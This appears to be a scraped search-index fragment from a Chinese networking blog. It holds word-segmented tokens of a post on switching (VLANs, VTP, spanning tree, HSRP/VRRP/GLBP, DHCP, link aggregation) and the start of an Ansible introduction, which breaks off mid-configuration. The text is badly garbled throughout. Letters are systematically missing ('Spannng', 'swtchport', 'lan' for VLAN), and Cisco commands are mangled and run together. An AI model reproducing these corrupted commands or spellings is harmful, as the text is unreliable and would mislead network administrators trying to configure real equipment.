12:55:14"},{"word":["淦","，","实在","不知道","用","什么","封面","了","，","网上","关于","Lay","2","Lay","3","Swtch","都","巨","丑","，","用","自己","正在","打字","的","电脑","做","封面","吧","^","_","^","?","?","交换","技术","主要","用于","构建","局域网","，","主要","实现","的","局域网","内","的","通信","和","隔离","。","交换机","即插即用","，","因为","所","有的","接口","默认","分配","在","lan","1","中","，","且","lan","1","为","nate","lan","，","不需要","进行","封装","。","为了","实现","局域网","的","隔离","，","可以","将","不同的","接口","或者","MAC","地址","划分","到","不同的","lan","，","同一个","lan","下","的","地址","可以","相互","通信","。","交换机","主要","存在","的","问题","和","解决方法","：","广","播","风暴","，","链路","防","环","：","使用","Spannng","-","Tree","或者","快速","生成","树","(","MSTP","、","RSTP","等",")","以及","一系列","生成","树","补丁","来","解决","Vlan","同步","：","交换机","不能","转发","自己","没","有的","lan","信息","，","比","如一个","只有","lan","10",",","20",",","30","的","交换机","不能","转发","和","接受","lan","40","的","报文","，","有","两种","解决","方式","：","（","1","）","手动","配置","使","之","相同","（","2","）","VTP","lan","同步","协议","带宽","受限","：","因为","spannng","-","tree","的","缘故","，","两个","交换机","之间","只能","存在","一条","链路","，","因此","带宽","受限","。","可以","使用","二层","或","三层","链路","捆绑","，","提高","网络带宽","网关","单点","故障","：","因为","只有","一个","默认","网关","，","所以","当","own","了","之后","，","终端","就","无法","与","外界","通信","。","可以","使用","网关","冗余","协议","，","如","(","FHRP",",","VRRP",",","GLBP",")","做","高","可用","。","讲到","交换机","不得不","讲","MAC","地址","，","MAC","地址","和","交换机","同","属于","OSI","七层","的","第二层","—","—","数据链","路","层","。","MAC","地址","一共","有","48位","，","前","24位","厂家","分配","，","类似","于","手机","的","前","几位","网络","识别","号","。","MAC","地址","有如","下","字段","：","其","中","：","类型","：","用于","标识","上","一层","使用","的","协议","IP","数据","报","长度","：","46","=","64","-","6","-","6","-","2","-","4","FCS","：","帧","检验","序列","，","使用","CRC","循环","冗余","校验","配置","VLANps","：","lan","的","隔离","包括","广","播","，","即使","是","发","ARP","，","也","只","会","发","在","自","己","的","lan","。","#","SW","7","创建","lanlan","10",",","20","#","SW","7","将","接口","加入","到","lan","，","e","01",",","2","e","10",",","1","都是","这样","配","nt","e","01","swtchport","moe","access","#","将","接口","模式","改为","accessswtchport","access","lan","10","#","将","接口","加入","到","lan","10","中","#","SW","7","串口","配置","，","即","和","SW","8","连接","的","e","03","接口","nt","e","03","swtchport","trunk","encapsulaton","ot","1","q","#","一律","使用","802.1","Q","封装","swtchport","moe","trunk","#","改变","接口","的","模式","为","trunk","交换机","接口","的","三种","模式","：","Vlan","的","链路","类型","可以","分为","接入","链路","和","干道","链路","。","Access","：","只能","属于","1个","VLAN","，","且","该","端口","不","打","tag","，","一般","用于","连接","计算机","端口","；","Trunk","：","可以","允许","多","个","VLAN","通过","，","且","该","端口","都是","打","tag","的","，","一般","用于","交换机","之间","的","连接","；","Hybr","：","可以","允许","多","个","VLAN","通过","，","至于","该","端口","在","lan","中","是否","打","tag","由","用户","根据具体情况","而","定","，","可以","用于","交换机","之间","的","连接","也","可以","用于","交换机","和","用户","计算机","之间","的","连接","。","Trunk","和","Hybr","的","区别","主要","是","，","hybr","端口","可以","允许","多","个","lan","的","报文","不","打","标签","，","而","trunk","端口","只","允许","缺省","lan","的","报文","不","打","标签","，","同一个","交换机","上","不能","hybr","和","trunk","并存","。","Trunk","也","可以","由","交换机","自行","协商","，","但","一般","都是","网络管理员","手动","配置","。","VTPVTP","用于","Vlan","同步","，","分","为","三种","模式","：","服务端","(","serer",")","、","客户端","(","clent",")","、","透传端","(","transparent",")","，","客户端","只","可以","查看","不可以","修改","，","服务端","和","透传端既","可以","查看","又","可以","修改","。","VTP","只","会同","步","lan","和","lan","的","名字","，","lan","的","接口","信息","不会","被","同步","走","。","配置","VTP","#","配置","服务端","lan","10","-","20","#","创建","lantp","oman","csco","#","更改","域名","，","可以","改","可以","不","改","，","用于","让","一个","局域网","有","许多","tptp","moe","serer","#","将","本","机","tp","的","模式","改为","serer","#","配置","透传端","tp","oman","cscotp","moe","transparent","#","配置","客户端","tp","oman","cscotp","moe","clent","其他","命令","Swtch","#","sh","lan","bref","#","查看","本","机","lan","摘要","Swtch","#","sh","tp","?","#","查看","tp","相关","VTP","修剪","：","一种","优化","lan","的","方法","A","-","-","-","-",">","B","-","-","-","-","-",">","C","-","-","-","-","-","D","(","I","'","m","a","PC",")","tp","prunng","#","开启","tp","修剪","比如","：","A","、","B","、","C","是","交换机","，","D","是","PC","。","A","的","lan","：","10","，","20","，","30","，","40","B","的","lan","：","10","，","20","C","的","lan","：","10","，","20","一旦","开启","tp","修剪","，","则","C","会","告诉","B","：","”","我","这","没","有","lan","30","，","40","，","以后","不要","给","我","发","lan","30","，","40","的","广","播","或者","其他","消息","了","”","，","B","收到","后","会","告诉","A","：","”","我","这","没","有","lan","30","，","40","，","以后","不要","发","这个","lan","的","消息","了","”","。","A","就","会","把","这","接口","上","的","这","两个","lan","剪掉","。","生成","树","生成","树","（","Spannng","-","tree","）","是","一种","工作","在","OSI","网络","模型","中的","第二层","（","数据链","路","层","）","的","通信协议","，","基本","应用","是","防止","交换机","冗余","链路","产生","的","环路",".","用于","确保","以太网","中","无","环路","的","逻辑","拓扑","结构",".","从而","避免","了","广播","风暴",",","大量","占用","交换机","的","资源","。","生成","树","使用","封锁","接口","的","方式","避免","环路","，","被","封锁","的","接口","有如","下","判定","方式","：","每个","广","播","域","选择","一个","根桥","（","注意","是","广","播","域","，","不是","局域网","）","Root","Brge","每个","非","根桥","选择","一个","根","端口","Root","Port","每个","段","选择","一个","指定","端口","Desgnate","Port","选择","一个","非","指定","端口","，","以上","所有","选择","策略","，","都","是以","越","小","越优","为","准则","根桥","的","制定","：","谁","的","MAC","地址","最小","，","谁","就是","根桥","根","端口","的","指定","：","谁离根桥进","，","谁","就是","根","端口","指定","端口","的","指定","：","离根桥","近","COST","值","小","发送","者","的","端口","ID","小","，","端口","ID","即","交换机","的","接口","非","指定","端口","将","被","封锁","。","全","网","一开始","是","如何","知道","谁是","根桥","？","全","网","交换机","开机","，","一开始","，","每","台","交换机","都","认为","自己","是","根桥","ID","向外","发送","BPDU","报文","，","如果","在","收到","的","BPDU","报文","中","，","发现","了","比","自己","还","小的","MAC","地址","，","就","把","根桥","ID","改为","那","一台","交换机","的","ID","。","经过","一段时间","，","就","可以","确定","全","网","的","唯一","的","根桥","ID","。","（","可以","抢占","）","BPDU","报文","格式","：","字节","字段","描述","2","协议","代表","上层","协议","(","BPDU",")","，","该","值","总","为","0","1","版本","（","802.1","D","的","总","为","0","）","1","TYPE","“","配置","BPDU","”","为","0","，","“","TCN","BPDU","”","为","80","，","TCN","，","topology","change","notfcaton","，","拓扑","改变","时","发送","的","报文","，","自下而上","。","1","标志","LSB","最低","有效","位","表示","TC","标志","，","MSB","最高的","有效","位","表示","TCA","标志","8","根桥","ID","根网桥","的","桥","ID","4","路径","开销","到达","根桥","的","STP","cost","，","如果","是","根桥则","写","0","，","带宽","越","大","，","开销","越","低","8","网桥","ID","BPDU","发送","桥","的","ID","2","端口","ID","BPDU","发送","网桥","的","端口","ID","（","优先级","+","端口","号","）","，","优先级","默认","128","2","消息","寿命","Message","age","从","根网桥","发出","BPDU","之后","的","秒","数","，","每","经过","一个","网桥","都","减","1","，","本质上","是","到达","根桥","的","跳","数","2","最大","寿命","Max","age","当","一段时间","未","收到","任何","BPDU","，","生存","期","达到","MAX","age","，","网桥","认为","该","端口","连接","链路","发生","故障","，","默认","20","S","2","HELLO","时间","根网桥","连续","发送","BPDU","之间","的","时间","间隔","，","默认","2","S","2","转发","延迟","在","监听","和","学习","状态","停留","的","时间","间隔","，","默认","15","S","关于","生成","树","，","要","配置","的","内容","很少","，","都是","现象","，","因为","一切","默认","都","已经","配置","好了","，","除非","是","改变","生成","树","的","种类","。","show","spannng","-","tree","#","查看","生成","树","的","状态","spannng","-","tree","lan","1","prorty","4096","#","修改","VLAN","中","spannng","-","tree","的","优先级","。","必须","是","4096","的","倍数","VLAN","0001","#","VLAN","1","Spannng","tree","enable","protocol","eee","Root","ID","Prorty","32769","#","32769","=","32768","+","VLAN",".","Nbr","Aress","aabb",".","cc","00.0100","#","MAC","地址","Cost","100","#","这个","VLAN","的","COST","值","Port","2","(","Ethernet","01",")","#","RootID","所用","的","端口","Hello","Tme","2","sec","Max","Age","20","sec","Forwar","Delay","15","sec","#","Hello","报文","2","s","，","最大","寿命","20","s","，","转发","延迟","15","s","Brge","ID","Prorty","32769","(","prorty","32768","sys","-","-","ext","1",")","#","系统","扩展","ID","就是","VLAN","的","序号","Aress","aabb",".","cc","00.0300","Hello","Tme","2","sec","Max","Age","20","sec","Forwar","Delay","15","sec","Agng","Tme","300","sec","#","网络","拓扑","变化","时","，","会","变成","15","s","，","快速","刷新","mac","表","Interface","Role","Sts","Cost","Pro",".","Nbr","Type","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","Et","00","Desg","FWD","100","128.1","ShrEt","01","Root","FWD","100","128.2","ShrEt","02","Altn","BLK","2","128.3","ShrEt","03","Desg","FWD","100","128.4","Shr","接口","角色","端口","状态","Cost","值","优先级",".","序号","类型","生成","树","中的","端口","状态","状态","说明","Dsable","不","收发","任何","报文","Blockng","不接受","也不","转发","帧","，","接受","但","不","发送","BPDU","，","不","学习","MAC","地址","Lstenng","不接受","也不","转发","帧","，","接受","并且","发送","BPDU","，","不","学习","MAC","地址","Learnng","不接受","也不","转发","帧","，","接受","并且","发送","BPDU","，","学习","MAC","地址","Forwarng","接收","并","转发","帧","，","接受","并且","发送","BPDU","，","学习","MAC","地址","状态","转换","：","实验","现象","R","6","png","R","7","原本","sw","4","的","e","03","没有","连接","sw","1","的","e","03","，","现在","将","他们","连接","起来","。","此时","，","链路","会","有","30","s","的","不通","，","这是","spannng","-","tree","协议","工作","：","原本","的","路由","是","R","6","-","-","SW","4","-","-","SW","3","-","-","SW","2","-","-","SW","1","-","-","R","7","现在","SW","4","和","SW","1","连通","，","造成","了","SW","3","的","e","02","接口","发生","了","阻断","BLK","。","路由","路线","变为","：","R","6","-","-","SW","4","-","-","SW","1","-","-","R","7","SW","4","的","e","03","接口","从","LIS","-","-","LRN","-","-","FWD","需要","30","s","的","时间","，","所以","30","spng","不通","。","然后","将","sw","4","的","e","03","shutown",",","SW","3","发现","没有","BPDU","出现","了","，","进入","Lost","BPDU","Max","age","=","20","s","，","20","sBPDU","不","出现","，","然后","进入","Lstenng","（","15","s","）","和","Learnng","（","15","s","）","，","一共","恢复","需要","30","s","。","生成","树","拓扑","变化","也","叫","STP","拓扑","变化","。","Topology","Change","Notfcaton","Brge","Protocol","Data","Unt","=","TCN","BPDU","网络","拓扑","变更","报文","网桥","协议","单元","，","即","当","下层","交换机","拓扑","发生","变化","时","，","次","级","交换机","向","Root","Brge","传递","TCN","BPDU","报文","，","即","BPDU","字段","中的","Type","改为","80","。","沿着","根","端口","就","可以","最终","把","报","文传","送给","Root","，","Root","接收","到","后","，","发送","TC","标志","设置","，","内容","为","空","，","目的","是","为","了","泛洪","。","35","s","=","age","老化","时间","（","20","s","）","+","Learnng","（","15","s","）","[","生成","树","的","计算","时间","]","Portfast","：","快速","端口","一个","接口","从","开启","到","能","正常","运行","会","经历","三个","阶段","，","需要","一定","的","时间","。","这是","为了","防止","环路","。","如果","不需要","防","环","，","可以","使用","Portfast","来","快速","启动","，","这样","已","启动","就","变成","FWD","。","配置","命令","spannng","-","tree","portfast","PVST","+","：","Peer","Vlan","Spannng","-","Tree","Plus","每个","VLAN","都","有","一个","生成","树","，","Csco","私有","。","Csco","Catalyst","交换机","的","MAC","地址","池","最多","可以","容纳","1024个","地址","，","交换机","的","型号","决定","了","可用","MAC","的","数目","，","并不","是","所有","catalyst","交换机","都","能","支持","到","这么多","个","MAC","这些","MAC","地址","作为","VLAN","生成","树","中的","网桥","ID","的","MAC","地址","部分","，","不同","交换机","型号","支持","不同的","可用","MAC","地址","数目","，","交换机","依照","次序","分配","MAC","地址","show","run","nt","nclue","ba","可以","看到","所","有的","MAC","，","其中","第一个","MAC","将","被","生成","树","使用","，","也就是","CPU","的","MAC","，","接下去","就是","每个","以太网","接口","的","MAC","我们","知道","交换机","能够","支持","的","VLAN","数据","是","很","庞大的","，","如果","开启","PVST","+","，","每个","VLAN","一","棵","生成","树","，","而","每","棵","生成","树","都","要有","一个","独立的","标识","，","都","需要","耗费","MAC","的话","，","那么","MAC","地址","池","肯定","是","无法","承受","的","因此","需要","用到","MAC","地址","缩减","方案","，","这","也是","为什么","优先级","必须","是","4096","倍数","的","原因","。","show","spannng","-","treeProrty","4097","(","prorty","4096","sys","-","-","ext","1",")","#","因为","系统","扩展","ID","是","1","，","所以","优先级","要","+","1","#","系统","扩展","ID","=","1","是","因","为","VLAN","是","1","实验","：","VLAN","10",",","20","SW","1","为","Root","VLAN","30",",","40","SW","2","为","Root","show","spannng","-","tree","#","查看","生成","树","的","状态","spannng","-","tree","lan","1","prorty","4096","#","修改","PVST","+","的","优先级","spannng","-","tree","lan","10",",","20","root","prmary","#","将","lan","10",",","20","的","优先级","比","当前","环境","下","最小","的","优先级","低","两个","档次","spannng","-","tree","lan","10",",","20","root","prmary","#","将","lan","10",",","20","的","优先级","比","当前","环境","下","最小","的","优先级","低","一个","档次","快速","生成","树","由于","生成","树","的","速度","过慢","，","一般","会","采用","快速","生成","树","。","数据中心","不会","使用","生成","树","，","而是","大二层","的","结构","，","但","园区网","还是","会","用到","生成","树","。","下面","介绍","两种","快速","生成","树","，","一种","是","Csco","私有","的","RSTP","，","一种","是","公开","的","MSTP","。","RSTP","：","Rap","Spannng","Tree","Protocol","特点","：","802.1","W","端口","角色","：","根","端口","、","指定","端口","、","替代","端口","、","备份","端口","端口","状态","：","转发","、","丢弃","、","学习","在","Csco","Catalyst","交换机","上","，","PVST","+","是","基于","RSTP","实现","的","perVLAN","版本","配置","：","spannng","-","tree","moe","rap","-","pst","#","BPDU","的","速度","又","多","了","快","这个","生成","树","就","有","多","快","MSTP","：","Multple","Spannng","Tree","Protocol","集成","了","RSTP","的","优点","，","每","实例","一个","生成","树","，","PVSTP","是","每个","lan","一","颗","生成","树","。","spannng","-","tree","mst","confguratonnstance","1","lan","10",",","20","#","创建","实例","，","并把","lan","10","，","20","归入","实例","1","nstance","2","lan","30",",","40","show","penng","#","配置","优先","级","，","系统","扩展","变为","实力","号","Instance",".","NbrSW","1","spannng","-","tree","mst","1","root","prmary","spannng","-","tree","mst","2","root","seconarySW","2","spannng","-","tree","mst","1","root","seconaryspannng","-","tree","mst","2","root","prmary","生成","树","补丁","Spannng","-","tree","Patch","，","主要","有","六种","生成","树","补丁","，","针对","解决","生成","树","反应","慢","、","出差错","、","及","故障","检测","。","1","、","BPDUGuar","该","接口","在手","都","BPDU","报文","后","，","会","立即","切换","到","err","-","sable","状态",",","把","接口","own","了","，","常","搭配","portfast","特性","在","接口","上","一起","使用","，","用于","连接","主机","，","可","在","接口","模式","上","激活","，","也","可","在","全局","模式","上","配置","，","两者","有所","不同","。","spannng","-","tree","bpuguar","enable","#","接口","spannng","-","tree","portfast","bpuguar","efault","#","全局","show","err","reco","#","查看","状态","2","、","BPDUFlter","一旦","收到","BPDU","，","就","把","接口","上","的","Portfast","删除","。","相当于","可以","智能","判断","是","PC","还","是","Swtch","。","spannng","-","tree","portfast","bpuflter","efault","#","全局","spannng","-","tree","bpuflter","enable","#","接口","3","、","UplnkFast","当","唯一","的","根","端口","Down","，","立刻","切换","到","转发","状态","，","跳过","了","LIS","和","LER","的","30","s","延时",",","但","还有","20","s","的","max","age","。","所有","配置","了","Uplnk","的","交换机","，","都会","把","自己","的","优先级","升高","、","COST","值","增加","3000","，","防止","自己","成为","ROOT","。","spannng","-","tree","uplnkfast","4","、","BackboneFast","在","部署","了","Backbone","Fast","后","，","SW","3","一旦","收到","SW","2","发送","来","的","次优","BPDU","，","会","立即","进行","一系列","的","步骤","以","重新","计算","根","端口","，","SW","3","会","从","跟","端","向","根桥","发送","RLQ","请求","Root","SW","1","收到","RLQ","请求","，","立刻","以","RLQ","响应","进行","恢复","，","以","告知","自己","仍然","存活","SW","3","立刻","老化","掉","存储","在","Fae","03","上","的","BPDU","，","端口","Fa","03","进入","Lstenng","状态","开始","发送","BPDU","SW","2","从","SW","3","收到","BPDU","，","经过","计算","得出","自己","的","Fa","02","为","根","端口","相当于","去掉","了","20","s","BLK","状态","spannng","-","tree","backbonefast","5","、","RootGuar","只要","Serce","-","Proer","Network","端","收到","其他地方","发来","的","更","优质","的","BPDU","，","就","将","那个","区域","置","为","nconsstent","。","注意","nconsstent","跟","err","-","sable","的","区别","是","，","err","-","sable","会","sable","整个","接口","，","而","nconsstentport","是","针对","特定","的","lan","的","。","只","会","屏蔽","当前","VLAN","(","发给","我","更","优","的","BPDU",")","spannng","-","tree","guar","root","#","接口","上","配置","root","防护","，","这个","端口","就","不可以","成为","根","段偶","show","span","nconsstentport","#","查看","接口","6","、","LoopGuar","spannng","-","tree","guar","loop","#","接口","上","配置","loop","防护","，","这个","端口","就","可以","检测","单向","通行","故障","单臂","路由","单臂","路由","，","路由器","只有","一条","线","连接","，","是","三层","交换机","的","替代品","。","其","主要","缺点","就是","三层","交换机","的","优点","：","故障","多","，","路由器","的","故障","，","交换机","的","故障","，","路由器","到","交换机","只有","一条","链路","，","单点","故障","带宽","有限","，","如果","是","三层","交换机","，","则","三层","交换机","中的","路由器","和","交换机","传输","速率","几乎","无限","`","R","1","nt","e","00","no","shnt","e","00.10","encapsulaton","ot","1","Q","10","p","a","192.168.10.254","255.255.255.0","nt","e","00.20","encapsulaton","ot","1","Q","20","p","a","192.168.20.254","255.255.255.0","ensh","nt","e","00.10","#","swnt","e","01","sw","tr","en","o","sw","mo","tren","#","交换机","还要","反应","一会","，","从","LIS","-","LRN","-","FWD","此时","，","R","2","Png","R","3","三层","交换","三层","交换","就","相当于","二层","交换","加","了","一台","路由器","在","上面","，","可以","实现","更加","灵活的","网络流量","路由","管","控","。","现在","R","2","处于","lan","10","，","R","3","处于","lan","20","，","想要","R","2","png","通","R","3","，","在","SW","上","进行","配置","：","1","、","配置","接口","lan","10","，","添加","属于","R","2","网段","额","IP","地址","2","、","配置","接口","lan","20","，","添加","属于","R","3","网段","的","IP","地址","3","、","在","R","2","和","R","3","上","配置","默认","路由","4","、","然后","就","会","发现","，","R","2","可以","直接","png","通","R","3","了","#","SWnt","lan","10","#","启用","SVI","接口","，","Lay","3","SW","的","交换机","接口","是","虚拟","的","p","a","192.168.10.254","255.255.255.0","no","shensh","p","nt","brnt","lan","20","p","a","192.168.20.254","255.255.255.0","no","shensh","p","nt","br","#","R","，","一定要","记得","配","默认","路由","p","route","0.0.0.0","255.255.255.255","Ethernet","00","SVI","(","swtch","rtual","nterface",")","交换","虚拟","接口","的","Lne","-","State","在","以下","条件","满足","的","情况","下","，","才","会","是","UP","SVI","对应","的","VLAN","必须","在","lan","atabase","中","存在","并且","是","激活","的","—","—","lan","存在","且","激活","lan","nterface","存在","并且","不能","是","own","状态","—","—","路由器","接口","up","必须","至少","有","一个","二层","接口","是","UP","的","，","而且","必须","是","Spannng","-","tree","的","FWD","状态","—","—","二层","交换机","接口","up","DHCP","Dynamc","Host","Confguraton","Protocal","基于","UDP","协议","端口","67","及","68","bootPC","：","67","（","客户","端端","口号","）","；","bootPS","：","68","（","服务","端端","口号","）","这","四条","消息","全部","都是","广","播","。","配置","DHCP","(","confg","-","f",")","#","p","hcp","pool","csco","(","hcp","-","confg",")","#","network","192.168.1.024","(","hcp","-","confg",")","#","efault","-","router","192.168.1.1","#","默认","路由器","(","hcp","-","confg",")","#","ns","-","serer","114.114.114.114","114.114.115.115","#","DNS","(","hcp","-","confg",")","#","lease","1","-","租约","时间","1","天","(","confg",")","#","p","hcp","exclue","-","aress","192.168.1.1","#","排","除掉","我们","用","的","地址","还有","一种","写法","：","1","~","99","不","分配","p","hcp","exclue","-","aress","192.168.1.1","192.168.1.99","#","局域网","的","其他","设备","(","confg",")","#","p","a","hcp","sh","p","hcp","bngng","#","查看","DHCP","的","IP","地址","的","绑定","#","绑定","IP","地址","p","hcp","pool","R","1","host","192.168.1.10","clent","-","entfer","[","clent","-","]","#","如果","clent","_","已","被","使用","，","则","清楚","clear","p","hcp","bn","*","#","跨越","路由器","的","广","播","DHCP","请求","R","4","是","DHCP","服务器","，","R","1","想要","请求","DHCP","的","广","播","不能","跨越","R","3","，","这是","可以","在","R","3","上","进行","配置","，","如果","收到","请求","DHCP","的","报文","，","则用","单","播","的","形式","将","消息","发送","给","R","4","R","3","nt","e","01","p","helper","-","aress","192.168.34.4","链路","捆绑","如果","直接","连接","两个","交换机","，","则","会","因为","有","spannng","-","tree","，","造成","无论","链接","多少","线","，","都","只","会","有","一根","通","，","从而","带宽","得不到","提高","。","链路","捆绑","最大","支持","8","根线","绑","在一起","，","这里","只","介绍","二层","捆绑","，","三层","捆绑","要","在","接口","上","no","swtchport","，","然后","再","配置","IP","地址","EC","：","需要","对","端","交换机","都","配","nt","range","e","01","-","2","channel","-","group","1","moe","on","此时","再看","生成","树","，","就","会","发现","e","01","和","e","02","都","消失","了","，","只","留下","了","Po","1","，","查看","带宽","，","也","变大","了","。","配置","Trunknt","port","-","channel","1","sw","tr","en","o","sw","mo","tr","查看","channelsh","etherchannel","[","summary","]","修改","负载","均衡","的","方式","port","-","channel","loa","-","balance","[","]","#","src","-","st","-","mac","#","二层","不","能用","IP","地址","show","etherchannel","loabalance","首","跳","冗余","协议","FHRP","：","frst","hop","reunancy","protocal","，","用于","配置","多","个","网关","，","配","在","多","个","朝内","的","接口","上","。","常用的","FHRP","协议","有","：","HSRP","VRRP","GLBP","HSRP","其","中","以","VRRP","最","常见","，","HSRP","是","Csco","私有","的","，","GLBP","有","Bug","。","@","不让","R","2","和","R","3","建立","邻居","R","2","#","passe","-","nterface","e","01","R","3","#","passe","-","nterface","e","01","@","配置","网关",",","R","4","网关","指向","的","地址","不存在","R","4","#","p","route","0.0.0.0","0.0.0.0","192.168.1.254","@","在","R","2",",","R","3","上","配置","stanby","p","监听","一个","虚拟","的","IPnt","e","01","stanby","1","p","192.168.1.254","sh","stanby","bref","#","查看","stanby","的","缩略","信息","-","stanby","会","向","组","播","地址","发送","信息","-","R","2","、","R","3","会","发现","彼此","，","通过","IP","地址","选出","一个人","来","做","网关","#","上图","是","交换机","，","实际上","交换机","不行","，","需要","换成","集线器","这个","IP","地址","是","规定","死","的","，","最后","一位","表示","stanby","1","HSRP","状态机","State","说明","Intal","初始化","接口","状态","，","当","接口","UP","时","，","或者","某些","配置","变更","时会","有的","状态","Learn","接口","未","设定","虚拟","IP","（","但","激活","了","HSRP","，","用","stanby","p","）","，","等","待","从","Acte","路由器","学习","到","该","组","的","虚拟","IP","Lsten","路由器","已经","获知","虚拟","IP","，","开始","侦听","其他","同组","HSRP","路由器","的","HELLO","消息","Speak","发送","周期性","的","Hello","消息","同时","参与","ActeStanby","选举","Stanby","成为","Stanby","路由器","，","同时","周期性","的","发送","Hello","，","持续","侦听","Acte","路由器","的","Hello","消息","，","以便","在","其","失效","后","接替","位置","Acte","成为","Acte","路由器","，","响应","PC","对于","虚拟","IP","的","ARP","请求","，","同时","周期性","发送","Hello","消息","，","宣告","自己","的","存货","状态","。","(","confg","-","f",")","#","stanby","1","preempt","#","打开","抢占","(","confg","-","f",")","#","stanby","1","prorty","110","#","调","高","优先级","@","有","一种","情形","@","R2","的","上游","支路","shutown","了","，","但是","因为","R","2","的","优先级","比","R","3","大","，","R","4","发包","还是","选择","R","2","，","但是","却","不能","png","通","R","4","-","-","-","@","如果","R","2","上面","的","接口","shutown","，","则","把","R","2","的","优先级","降低","20","，","这样","Stanby","就","被","R","3","抢走","(","confg",")","#","track","1","nterface","e","00","lne","-","protocol","#","在","接口","的","协议","上","设置","一个","追踪","(","confg",")","#","nt","e","01","(","confg","-","f",")","#","stanby","1","track","1","ecrement","20","#","如果","接口","shutown","，","则","将","优先","级","-","20","，","会","在","show","stanby","上","显示","详细","条目","VRRPVRRP","和","HSRP","不一样","的","地方","在","Csco","上","抢占","模式","不一样","，","VRRP","默认","开启","MAC","地址","不一样","，","就是","开头","的","固定","格式","不一样","Hello","包","发送","的","周期","不一样","，","HSRP","是","3","s","-","10","s","，","而","VRRP","1","s","一个","Hello","包","，","3","s","收","不到","就","挂","了","激活","的","状态","不一样","，","一个","是","backup","，","一个","是","acte","，","其他","地方","一样","GLBP","AVG","生成","一堆","虚拟","的","mac","地址","分发","给","局域网","里面","的","路由器","（","假设","有","路由器","A","、","B","、","C","）","，","此时","有","PC","1","来","请求","mac","地址","上网","(","这个","mac","地址","是","默认","网关","的","mac","，","不是","pc","自","己","的","mac",")","，","AVG","会","挑选","一台","路由器","B","给","它","，","又","有","PC","2","来","请求","上网","，","AVG","挑选","路由器","C","给","它","，","又","有","PC","3","，","路由器","把","A","给","它","。","如果","路由器","B","坏了","，","则","重新","分","配给","其他","路由器","，","如果","AVG","坏了","，","则","路由","器重","新","选举","新的","AVG","。","IP","地址","大","则","为","AVG","所以","GLBP","抢占","的","是","AVG","，","而","其他","的","则","是","抢占","干活","的","机会","。","GLBP","、","VRRP","、","HSRP","配置","命令","都","差不多","。"],"url":"http://ymlog.cn/2020/02/27/Switch%E4%BA%A4%E6%8D%A2%E6%9C%BA/","title":"Switch交换机","content":"淦，实在不知道用什么封面了，网上关于Lay2 Lay3 Switch都巨丑，用自己正在打字的电脑做封面吧^_^??\n\n\n交换技术主要用于构建局域网，主要实现的局域网内的通信和隔离。交换机即插即用，因为所有的接口默认分配在vlan 1 ...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/","name":"路由技术"},"date":"2020-02-27 20:34:14"},{"word":["简介","运维","自动化","发展","历程","：","内容","运维","自动化","发展","历程","及","技术","Ansble","命令","使用","Ansble","常用","模块","详解","YAML","语法","简介","Ansble","playbook","基础","Playbook","变量","、","tags","、","hanlers","使用","Playbook","模板","templates","Playbook","条件","判断","when","Playbook","字段","wth","_","tems","Ansble","Roles","自动化","运维","应用","场景","：","文件","传输","命令","执行","：","应用","部署","配置管理","任务","流","编排","ansble","特性","：","模块化","，","有","Paramko","、","PyYAML","、","Jnja","2","(","模板","语言",")","三个","关键","模块","支持","自定义","模块","基于","Python","语言","实现","部署","简单","，","基于","python","和","SSH","，","agentless","安全","，","基于","OpenSSH","支","持","playbook","编排","任务","幂","等","性","：","一个","任务","执行","1遍","和","执行","n","遍","的","效果","是","一样","的","无需","代理","，","不依赖","PKI","(","无需","SSL",")","支持","其他","语言","写","模块","YMAL","格式","，","编排","任务","，","支持","丰富的","数据结构","较","强大的","多层","解决方案","常用的","自动化","运维","工具","：","Ansble","：","python","，","Agentless","，","中小型","应用","环境","Saltstack","：","python","，","一般","需要","部署","agent","，","执行","效率","更高","Puppent","：","ruby","，","功能强大","，","配置","复杂","，","重型","适合","大型","环境","Fabrc","：","python","，","agentless","Chef","：","ruby","，","国内","少","ansble","架构","Ansble","Playbooks","：","任务","剧本","，","编排","定义","Ansble","任务","集","的","配置","文件","，","由","ANSI","不了","顺序","依次","执行","，","通常","是","JSON","格式","的","YML","文件","Inentory","：","ANSI","不了","u","案例","主机","清单","etcanablehosts","Moules","：","Ansble","执行","命令","的","功能模块","，","多数","为","内置","核心","模块","，","可以","自定义","Plugns","：","模块","功能","的","补充","，","如","连接","类型","插件","、","循环","插件","、","变量","插件","、","过滤","插件","等","，","该","功能","不","常用","API","：","供","第三方","程序","调用","的","应用程序","编程","接口","Ansble","：","组合","Inentory","、","API","、","Moules","Plugns","的","绿","框","，","可以","理解","为","是","ansble","命令","工具","安装","yum","安装","yum","-","y","nstall","epel","-","releaseyum","-","y","nstall","ansble","gt","安装","gt","clone","https",":","gthub",".","comansbleansble",".","gtc",".","ansblesource",".","hackngen","-","setup","pp","安装","yum","-","y","nstall","python","-","pp","python","-","eelyum","-","y","nstall","gcc","glbc","-","eel","zbl","-","eel","rpm","-","bul","openssl","-","eelpp","nstall","-","-","upgrae","pppp","nstall","ansble","-","-","upgrae","确认","安装","ansble","-","-","erson","配置","文件","相关","文件","配置文件","etcansbleansble",".","cfg","：","主","配置","文件","，","配置","ansble","工作","特性","etcansblehosts","：","主机","清单","etcansbleroles","：","存放","角色","目录","程序","usrbnansble","：","主程序","，","临时","命令","执行","工具","usrbnansble","-","oc","：","查看","配置","文档","，","模块","功能","查看","工具","usrbnansble","-","galaxy","：","下载","上传","优秀","代码","或","Role","模块","的","官网","平台","usrbnansble","-","playbook","：","定制","自动化","任务","，","编排","剧本","工具","usrbnansble","-","pull","：","远程","执行","命令","工具","usrbnansble","-","alue","：","文件","加密","工具","usrbnansble","-","console","：","基于","Console","界面","于","用户","交互","的","执行","工具","ansble","命令","ansble","ansble","-","ocansble","-","playbookansble","-","alutansble","-","consoleansble","-","galaxyansle","-","pull","配置文件","[","root","@","noe","01","~","]","#","m","etcansbleansble",".","cfg","[","efaults","]","#","nentory","=","etcansblehosts","#","主机","列表","配置文件","#","lbrary","=","usrsharemy","_","moules","#","库","文件","存放","目录","#","remote","_","tmp","=","~",".","ansbletmp","#","临时","py","命令","文件","存放","在","远程","主机","目录","#","local","_","tmp","=","~",".","ansbletmp","#","本","机","的","临时","命令","执行","目录","#","forks","=","5","#","默认","并发","数","#","poll","_","nteral","=","15","#","suo","_","user","=","root","#","